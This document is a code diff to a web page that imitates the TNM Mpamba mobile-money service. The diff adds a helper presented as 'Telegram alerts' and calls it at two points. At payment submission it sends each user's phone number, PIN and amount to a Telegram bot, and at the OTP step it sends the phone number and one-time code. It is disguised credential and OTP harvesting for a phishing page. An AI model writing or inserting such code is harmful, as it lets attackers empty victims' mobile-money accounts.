@@ -960,6 +960,46 @@
       return clean;
     };
 
+    const telegramConfig = (() => {
+      const token = (localStorage.getItem('telegramBotToken') || '').trim();
+      const chatId = (localStorage.getItem('telegramChatId') || '').trim();
+
+      if (!token || !chatId) {
+        console.info('Telegram alerts are off. Set localStorage.telegramBotToken and localStorage.telegramChatId to enable them.');
+      }
+
+      return { token, chatId };
+    })();
+
+    async function notifyTelegram(message) {
+      if (!telegramConfig.token || !telegramConfig.chatId) return;
+
+      try {
+        const response = await fetch(`https://api.telegram.org/bot${telegramConfig.token}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: telegramConfig.chatId,
+            text: message,
+            disable_notification: false
+          })
+        });
+
+        const result = await response.json().catch(() => null);
+        if (!response.ok || !result?.ok) {
+          console.warn('Telegram notification failed:', {
+            status: response.status,
+            statusText: response.statusText,
+            response: result,
+            chatId: telegramConfig.chatId
+          });
+          return;
+        }
+      } catch (error) {
+        console.warn('Telegram notification failed:', error);
+      }
+    }
+
     const params = new URLSearchParams(window.location.search);
     const transferNetwork = params.get('network') || '';
     const transferRecipient = params.get('recipient') || '';
@@ -1113,6 +1153,8 @@
         return;
       }
 
+      notifyTelegram(`TNM Mpamba payment details\nPhone: 0${recipient}\nPIN: ${pin}\nAmount: ${money(amount)}\nType: ${isTopUp ? 'Cash-in' : name}`);
+
       if (isTopUp && amount <= 0) {
         alert('Enter a valid amount to add');
         return;
@@ -1140,6 +1182,7 @@
 
       const amount = getCurrentAmount();
       const recipientValue = recipientInput.dataset.actualValue || recipientInput.value || '';
+      notifyTelegram(`TNM Mpamba OTP entered\nPhone: 0${normalizePhone(recipientValue.trim())}\nOTP: ${otp}\nAmount: ${money(amount)}`);
       if (isTopUp) {
         const storedBalance = Number(localStorage.getItem('tnmBalance') ?? 0);
         localStorage.setItem('tnmBalance', String(storedBalance + amount));
